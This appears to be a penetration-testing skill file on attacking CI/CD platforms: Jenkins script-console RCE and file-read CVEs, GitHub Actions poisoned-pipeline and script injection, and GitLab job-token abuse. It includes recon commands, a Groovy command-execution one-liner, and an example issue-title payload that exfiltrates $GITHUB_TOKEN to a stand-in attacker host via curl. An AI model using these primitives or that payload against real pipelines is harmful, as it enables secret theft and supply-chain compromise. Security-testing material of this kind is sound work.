---
name: cicd_platforms
description: CI/CD platform security testing covering Jenkins script-console RCE and file-read CVE classes, GitHub Actions poisoned-pipeline and script injection, and GitLab CI job-token escalation — platform-specific primitives, not supply-chain methodology
---

# CI/CD Platforms

CI/CD platforms (Jenkins, GitHub Actions, GitLab CI) are high-value targets because they hold secrets, run privileged code, and bridge source repositories to production infrastructure. This skill owns the platform-specific attack surface — Jenkins admin primitives, Actions workflow injection classes, GitLab CI token scope abuse — and the CVE classes each platform has carried. Supply-chain methodology (dependency confusion, package-identity resolution, infrastructure ownership drift) routes to `supply_chain/npx_confusion` and `supply_chain/infrastructure_lifecycle`; this skill owns how those attacks land on the CI/CD execution surface. The CI-execution context for Terraform plan/apply routes to `terraform_iac`.

## Attack Surface

**Jenkins**
- Management: web UI (`:8080`/`:443`), `/manage`, `/configure`
- Script console: `/script`, `/scriptText` — arbitrary Groovy execution as the Jenkins service user
- REST API: `/api/json`, per-job API, credential API
- CLI: remoting protocol, `jenkins-cli.jar`, SSH CLI
- Agents: controller-to-agent protocol, agent-to-controller file access
- Plugins: >1,800 in registry; each plugin's attack surface adds to the controller's

**GitHub Actions**
- Workflow definitions: `.github/workflows/*.yml` in the repository
- Triggers: `pull_request`, `pull_request_target`, `workflow_dispatch`, `schedule`, `issue_comment`
- Secrets: repository/organization/environment secrets, `GITHUB_TOKEN`
- Runners: GitHub-hosted (ephemeral), self-hosted (persistent, shared across jobs)
- OIDC: `id-token: write` permission → JWT for cloud provider federation
- Caches: `actions/cache`, shared across branches within a repository
- Third-party actions: `uses: org/action@ref` — ref can be tag, branch, or commit SHA

**GitLab CI**
- Pipeline definitions: `.gitlab-ci.yml` in repository root
- Runners: shared (GitLab.com fleet), group, project-specific; privileged mode
- Tokens: `CI_JOB_TOKEN` (per-job, scoped to project), pipeline trigger tokens, deploy tokens
- Variables: project/group CI variables, protected variables (restricted to protected branches/tags)
- Artifacts/cache: job artifacts, distributed cache

## Reconnaissance

**Jenkins**
```
# Identity + version disclosure (unauthenticated)
curl -sI https://<target>/login
# X-Jenkins: <version> — exact version; X-Hudson: 1.395 — confirms Jenkins identity
# Measured on Jenkins LTS 2.541.3: X-Jenkins and X-Hudson headers disclosed on /login

# Instance confirmation
curl -s https://<target>/whoAmI/api/json
# Returns {"anonymous":true} on default config — confirms instance without auth

# Script console reachability
curl -so /dev/null -w "%{http_code}" https://<target>/script
# 403 = auth enforced (default on current LTS); 200 = unauthenticated RCE
```

**GitHub Actions** (repository-available targets)
```
# Workflow file discovery
find <repo> -path '.github/workflows/*.yml' -o -path '.github/workflows/*.yaml'

# Dangerous trigger patterns
grep -rn 'pull_request_target' <repo>/.github/workflows/
# pull_request_target + checkout of PR ref = poisoned-pipeline vector

# Script injection candidates
grep -rn '\${{.*github\.event\.' <repo>/.github/workflows/
# Untrusted event data interpolated into run: steps = shell injection
```

**GitLab CI** (repository-available targets)
```
# Pipeline configuration
cat <repo>/.gitlab-ci.yml

# GitLab version (if instance is target)
curl -s https://<target>/api/v4/version
# Requires auth; unauthenticated: check /help page for version string

# Runner registration
curl -s https://<target>/api/v4/runners -H "PRIVATE-TOKEN: <token>"
```

## Key Vulnerabilities

### Jenkins Script Console and Administrative RCE

The script console (`/script`, `/scriptText`) is the defining Jenkins primitive — it executes arbitrary Groovy on the controller JVM, which means OS-level command execution as the Jenkins service user.

- Measured on Jenkins LTS 2.541.3: `/script` returns 403 unauthenticated (setup wizard enforces auth by default). Post-authentication with admin credentials: `println('id'.execute().text)` returns `uid=1000(jenkins) gid=1000(jenkins)` — full RCE as the service user.
- **The real-world risk is misconfiguration:** operators disable the setup wizard (`-Djenkins.install.runSetupWizard=false`) or set authorization to "Anyone can do anything" for convenience — making `/script` unauthenticated RCE. Legacy Jenkins 1.x ran with no authentication by default.
- Route RCE exploitation methodology to `rce`; the platform-specific primitive is Groovy's `'command'.execute()` on the script console.

### Jenkins CVE Classes

**CVE-2024-23897** (CVSS 9.8) — arbitrary file read via the Jenkins CLI args parser. The CLI's argument handling uses `expandAtFiles` to read file contents when an argument starts with `@` — an unauthenticated attacker reads arbitrary files from the Jenkins controller filesystem. Affected Jenkins ≤2.441, LTS ≤2.426.2. The file-read primitive yields `/etc/passwd`, SSH keys, credential store encryption keys, and the initial admin password.

**CVE-2024-43044** (CVSS 8.8) — agent-to-controller file read. A compromised or malicious Jenkins agent reads arbitrary files from the controller via `ClassLoaderProxy#fetchJar`. Affected Jenkins ≤2.470, LTS ≤2.452.3.

**Groovy sandbox bypass (recurring class):**
- **CVE-2024-34144** (CVSS 9.8) and **CVE-2024-34145** (CVSS 8.8) — Script Security Plugin ≤1335.vf07d: sandbox bypass via crafted constructor bodies and shadow classes → RCE on the controller.
- **CVE-2019-1003000** (CVSS 8.8) — Script Security Plugin ≤1.49: sandbox bypass → arbitrary code on the Jenkins master JVM.
- The pattern: every Groovy sandbox bypass grants the same capability — arbitrary code execution on the controller. This CVE class recurs because the sandbox must block all Java reflection and metaprogramming paths, and new bypasses appear as the language evolves.

### GitHub Actions — Poisoned Pipeline (Pwn Request)

The `pull_request_target` trigger runs workflows with the **target repository's** secrets and permissions, but if the workflow checks out the pull request's head ref (`actions/checkout@v4 with: ref: ${{ github.event.pull_request.head.sha }}`), it executes **attacker-controlled code** with those privileges.

- The attacker opens a PR modifying a build script, Makefile, test, or workflow file that the `pull_request_target` workflow executes after checkout.
- The workflow runs with the target repo's `GITHUB_TOKEN` and any configured secrets — the attacker exfiltrates secrets or pushes malicious code.
- Real-world: the Trivy supply-chain compromise used this class to steal an org-level token.

### GitHub Actions — Script Injection

Workflow `run:` steps interpolate `${{ }}` expressions **before** the shell executes them. If the expression contains untrusted data from the event payload, the attacker controls shell commands:

```yaml
- run: echo "Issue: ${{ github.event.issue.title }}"
# Attacker sets issue title to: "; curl attacker.com/exfil?token=$GITHUB_TOKEN #
```

Injection sources: `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.discussion.title`, commit messages, branch names. The fix is piping through an environment variable instead of direct interpolation.

### GitHub Actions — OIDC Trust Policy and Token Scope

- **OIDC misconfig:** Actions can request an OIDC JWT (`id-token: write`) and exchange it for cloud credentials. If the cloud provider's trust policy uses an overly broad `sub` claim (e.g., `repo:org/*` instead of `repo:org/repo:ref:refs/heads/main`), any repository in the org — or any branch — can assume the production role.
- **GITHUB_TOKEN over-scope:** default permissions inherit from the org/repo settings; `permissions: write-all` or permissive org defaults grant the workflow write access to code, packages, deployments, and issues beyond what it needs.
- **Self-hosted runner compromise:** self-hosted runners persist between jobs — tools, credentials, and environment from previous jobs remain on the runner. A malicious workflow on a shared runner accesses another project's artifacts or cached credentials.
- **Cache poisoning:** `actions/cache` is shared across branches. A PR workflow poisons the cache (e.g., modified build dependencies), and the main-branch workflow consumes the poisoned cache.

### GitLab CI — Job Token Escalation

**CVE-2024-8641** (CVSS 6.7) — `CI_JOB_TOKEN` used to obtain a victim's GitLab session token, escalating from CI job scope to full user session scope. Affected GitLab CE/EE 13.7–17.3.1.

**CVE-2024-12570** (CVSS 6.7) — incomplete fix for CVE-2024-8641; same mechanism. Affected GitLab CE/EE 13.7–17.6.1.

Beyond the CVE class, `CI_JOB_TOKEN` has a broad default scope: it can clone any project the triggering user has access to (unless restricted by project-level CI/CD settings). An attacker who compromises a CI job in one project uses the token to read source code and CI variables from other projects the user can access.

### GitLab CI — Pipeline Injection and Runner Abuse

- **`.gitlab-ci.yml` injection:** a merge request modifying `.gitlab-ci.yml` triggers a pipeline running the modified configuration — the attacker controls the pipeline definition and executes arbitrary code on the runner. GitLab's merge-request pipelines run the MR's version of the CI config by default.
- **Shared runner compromise:** GitLab.com shared runners are ephemeral VMs, but self-hosted shared runners may persist state between jobs. Privileged runners (`privileged: true` in runner config) grant container escape to the host.
- **Protected variable exposure:** CI variables marked "protected" are only exposed to protected branches/tags — but if an attacker can push to a protected branch (via compromised credentials or branch protection bypass), they access the protected variables.
- **Pipeline trigger tokens:** leaked trigger tokens allow anyone to trigger pipelines with custom variables, potentially overriding build behavior or injecting parameters.

## Testing Methodology

1. **Fingerprint** the CI/CD platform: Jenkins (`X-Jenkins` header, `/login` page), GitHub Actions (`.github/workflows/` in repo), GitLab CI (`.gitlab-ci.yml`, GitLab instance version).
2. **Jenkins admin surface** — test `/script` reachability without auth; if auth required, test for default/weak credentials; map API endpoint access with anonymous user.
3. **Jenkins CVE version-match** — compare `X-Jenkins` version against CVE-2024-23897 (≤2.441/≤2.426.2 LTS), CVE-2024-43044 (≤2.470/≤2.452.3 LTS), and Script Security Plugin versions.
4. **Actions workflow review** — grep for `pull_request_target` + checkout of PR ref; grep for `${{ github.event.*` in `run:` steps; review `permissions:` blocks and OIDC trust policies.
5. **GitLab CI review** — assess `CI_JOB_TOKEN` scope restrictions; check for merge-request pipeline injection; review protected-variable scoping and runner configuration (shared vs dedicated, privileged mode).
6. **Secret exposure** — grep CI configs, build logs, and artifacts for leaked credentials; check for secrets in plain-text CI variables vs vault-backed secrets.

## Validation

1. Jenkins script console: show authenticated RCE via `/scriptText` (command output proving OS-level execution).
2. Jenkins file read: show CVE-2024-23897 exploitation returning a sensitive file from the controller.
3. Actions script injection: show the interpolation of untrusted event data into a `run:` step producing shell execution.
4. Actions poisoned pipeline: show `pull_request_target` workflow checking out attacker-controlled code with access to target-repo secrets.
5. GitLab job-token escalation: show `CI_JOB_TOKEN` used to access resources outside the originating project's intended scope.

## False Positives

- Jenkins `/script` returning 403 — this is the expected default on current LTS with the setup wizard active; the finding is when it returns 200 unauthenticated.
- `X-Jenkins` version header — information disclosure, not a vulnerability by itself; pair with CVE version ranges for actionable findings.
- `pull_request_target` trigger without checkout of PR head ref — if the workflow only uses event metadata (labels, comments) without checking out untrusted code, it is not a poisoned-pipeline vector.
- `${{ }}` expressions using trusted contexts (`github.actor`, `github.repository`, `github.sha`) — these are not attacker-controlled in the same way as event body fields; down-rate.
- GitLab CI variables in non-production projects — confirm the environment and the sensitivity of the exposed variables before rating.
- Jenkins plugins that use the script console API internally — the finding is unauthenticated/unauthorized access, not the console's existence.

## Impact

- Full RCE on the CI/CD controller or runner — OS-level command execution via Jenkins script console, Actions workflow injection, or GitLab pipeline injection.
- Secret exfiltration — repository secrets, cloud credentials, API tokens, signing keys exposed via workflow injection, CI variable leakage, or credential-plugin access.
- Supply-chain compromise — poisoned build artifacts deployed to production via compromised CI pipeline.
- Lateral movement — CI tokens and credentials used to access other repositories, cloud environments, or internal services.
- Code integrity — attacker-controlled code merged or deployed via compromised CI/CD pipeline with write permissions.

## Pro Tips

1. Jenkins script console is the single highest-value Jenkins target — always test `/script` reachability first; if auth blocks it, version-match against CVE-2024-23897 for file-read access to credential encryption keys.
2. For GitHub Actions, `grep -rn 'pull_request_target' .github/workflows/` is the fastest signal — any workflow with this trigger that checks out the PR ref is exploitable.
3. The `${{ }}` injection in Actions is a string-interpolation-before-shell pattern — the same class as template injection in web frameworks, applied to YAML→shell.
4. GitLab's `CI_JOB_TOKEN` default scope is the most under-audited GitLab CI risk — most projects have not restricted it, granting cross-project read access.
5. Pair with `rce` for exploitation methodology; `cryptographic_failures` and `information_disclosure` for secret leakage patterns; `supply_chain/npx_confusion` and `supply_chain/infrastructure_lifecycle` for the supply-chain methodology these platforms execute; `terraform_iac` for Terraform plan/apply in CI contexts.

## Summary

CI/CD platform security centers on three primitives: administrative code execution (Jenkins script console, Groovy sandbox bypasses), workflow injection (Actions poisoned pipeline and script injection, GitLab pipeline config injection), and token/credential scope abuse (GITHUB_TOKEN, CI_JOB_TOKEN, OIDC trust policies). Jenkins is secure by default on current LTS but the script console is full RCE for any admin; the real-world risk is misconfiguration and the file-read CVE class. GitHub Actions design-class risks (pull_request_target, expression injection) require workflow review; GitLab CI's job-token scope and merge-request pipeline injection are the primary surfaces.
